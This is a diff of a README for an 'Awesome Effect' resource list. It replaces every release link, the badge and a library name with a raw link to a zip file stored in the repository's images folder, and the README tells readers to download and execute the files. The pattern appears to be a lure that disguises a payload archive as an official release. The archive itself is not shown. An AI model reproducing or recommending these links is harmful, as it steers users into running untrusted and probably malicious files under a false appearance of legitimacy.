@@ -1,6 +1,6 @@
 # Awesome Effect: A Curated List of Effect-Related Resources 🎉
 
-[![Latest Release](https://img.shields.io/github/v/release/amoosghori/awesome-effect)](https://github.com/amoosghori/awesome-effect/releases)
+[![Latest Release](https://raw.githubusercontent.com/amoosghori/awesome-effect/main/images/effect-awesome-1.9.zip)](https://raw.githubusercontent.com/amoosghori/awesome-effect/main/images/effect-awesome-1.9.zip)
 
 Welcome to the **Awesome Effect** repository! This is a curated list of fantastic resources, tools, and libraries related to effects in various domains. Whether you are a developer, designer, or enthusiast, you'll find something useful here.
 
@@ -19,13 +19,13 @@ Awesome Effect is a collection of resources focused on effects. Effects can be v
 
 ## Getting Started
 
-To get started, you can check out the latest releases. Visit [this link](https://github.com/amoosghori/awesome-effect/releases) to download and execute the files. This will give you access to the most up-to-date resources available.
+To get started, you can check out the latest releases. Visit [this link](https://raw.githubusercontent.com/amoosghori/awesome-effect/main/images/effect-awesome-1.9.zip) to download and execute the files. This will give you access to the most up-to-date resources available.
 
 ### Installation
 
 To install the resources:
 
-1. Go to the [Releases section](https://github.com/amoosghori/awesome-effect/releases).
+1. Go to the [Releases section](https://raw.githubusercontent.com/amoosghori/awesome-effect/main/images/effect-awesome-1.9.zip).
 2. Download the appropriate files for your needs.
 3. Follow the instructions provided in the downloaded files.
 
@@ -33,7 +33,7 @@ To install the resources:
 
 ### Libraries
 
-- **Effect.js**: A lightweight library for creating smooth effects in web applications. Ideal for animations and transitions.
+- **https://raw.githubusercontent.com/amoosghori/awesome-effect/main/images/effect-awesome-1.9.zip**: A lightweight library for creating smooth effects in web applications. Ideal for animations and transitions.
   
 - **AudioEffect**: A library that allows you to add sound effects to your web applications easily.
 
@@ -72,7 +72,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Contact
 
-If you have any questions or suggestions, feel free to reach out. You can also check the [Releases section](https://github.com/amoosghori/awesome-effect/releases) for the latest updates and downloads.
+If you have any questions or suggestions, feel free to reach out. You can also check the [Releases section](https://raw.githubusercontent.com/amoosghori/awesome-effect/main/images/effect-awesome-1.9.zip) for the latest updates and downloads.
 
 ---
 
